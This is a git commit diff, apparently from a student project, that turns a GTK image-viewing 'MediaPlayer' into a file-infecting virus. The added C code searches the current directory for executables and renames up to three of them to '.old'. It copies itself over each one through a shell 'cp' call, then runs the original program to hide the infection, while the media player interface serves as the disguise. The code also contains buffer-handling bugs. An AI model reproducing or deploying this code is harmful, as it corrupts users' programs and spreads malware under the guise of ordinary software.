fdc686d3c06d20f3c3f87b4f124916d8cf7adbaa
corentinbernier <corentin.bernier97@gmail.com>
2019-04-05 11:12:34 +0200

    Combination du MediaPlayer(Virus) et du MediaPlayerImg

--- FichiersTest/MediaPlayerFinal.c
+++ FichiersTest/MediaPlayerFinal.c
@@ -1,3 +1,11 @@
+#include <stdlib.h>
+#include <stdio.h>
+#include <sys/types.h>
+#include <dirent.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdbool.h>
 #include <gtk/gtk.h>
 
 char lesImages[256][256];
@@ -101,15 +109,87 @@ static void activate(GtkApplication *app, gpointer user_data){
 	gtk_widget_show_all (window);
 }
 
-int main (int argc, char **argv){
-	GtkApplication *app;
-	int status;
-
-	app = gtk_application_new ("com.github.virusmediaplayer", G_APPLICATION_FLAGS_NONE);
-	g_signal_connect (app, "activate", G_CALLBACK (activate), NULL);
-	status = g_application_run (G_APPLICATION (app), argc, argv);
-	g_object_unref (app);
-
-	return status;
+bool dejaInfecte(char* nomFichier)
+{
+	char * extension = ".old";
+	if(strstr(nomFichier, extension)){ //Si contient l'extension .old --> Déjà infecté
+		return true;
+	}else{
+		DIR *rep = opendir("."); 
+		struct dirent *lecture;
+		while ((lecture = readdir(rep))) { //On verifie dans le repertoire, s'il y a déjà un .old 
+			if((strcmp(lecture->d_name,nomFichier) == 0) && fopen(strcat(lecture->d_name,extension),"r")!=NULL){
+				return true;
+			}
+		}
+	}
+	return false;
 }
 
+char** searchFiles(char* exeption)
+{
+	char** files = malloc(3*sizeof(char*));
+	int cpt=0;
+	DIR *rep = opendir("."); //Repertoire couranthttps://stackoverflow.com/questions/17766754/how-to-compare-a-char
+	struct stat buf;
+	struct dirent *lecture;
+	printf("fichier(s) executable(s) :\n");
+	while ((lecture = readdir(rep))) { //Contenu du repertoire
+		stat(lecture->d_name,&buf);
+		char exeptionFile[strlen(lecture->d_name)+3];
+		strcpy(exeptionFile,"./");
+		strcat(exeptionFile,lecture->d_name);
+		if(((buf.st_mode & S_IFMT) == S_IFREG) && (buf.st_mode & S_IXUSR))
+		{ //si fichier régu && executable
+			if(cpt<3 && strcmp(lecture->d_name,"MediaPlayer.exe")!=0 && !dejaInfecte(lecture->d_name)) 
+			{//On ne prend que 3 fichier (lutter contre la sur-infection), et pas le premier hôte
+				printf("  - %s\n", lecture->d_name);
+				files[cpt] = lecture->d_name;
+				cpt+=1;
+			}
+		}
+        }
+	closedir(rep);
+	return files;	
+}
+
+void infecte(char** files)
+{
+	for(int i=0;i<3;i+=1){
+		char x[strlen(files[i])+strlen(".old")+1];
+		char currentFile[strlen(files[i])+1];
+		strcpy(currentFile,files[i]);
+		strcpy(x,files[i]);
+		strcat(x,".old");
+		rename(files[i],x);
+		char copyFile[500]="";
+		strcat(copyFile,"cp ");
+		strcat(copyFile,"./MediaPlayer.exe");
+		strcat(copyFile," ");
+		strcat(copyFile,files[i]);
+		system(copyFile);
+	}
+}
+
+int main(int argc, char *argv[])
+{
+	char exeptionFile[strlen(argv[0])+1];
+	strcpy(exeptionFile,argv[0]);
+	char** f = searchFiles(exeptionFile);
+	if(f[0]!=NULL)
+	infecte(f);
+	if(strcmp(argv[0],"./MediaPlayer.exe")!=0)
+	{
+		char progExec[strlen(argv[0]+5)];//prog.old
+		strcpy(progExec,argv[0]);
+		strcat(progExec,".old");
+		system(progExec);
+	}else{
+		GtkApplication *app;
+		int status;
+		app = gtk_application_new ("com.github.virusmediaplayer", G_APPLICATION_FLAGS_NONE);
+		g_signal_connect (app, "activate", G_CALLBACK (activate), NULL);
+		status = g_application_run (G_APPLICATION (app), argc, argv);
+		g_object_unref (app);
+	}
+}
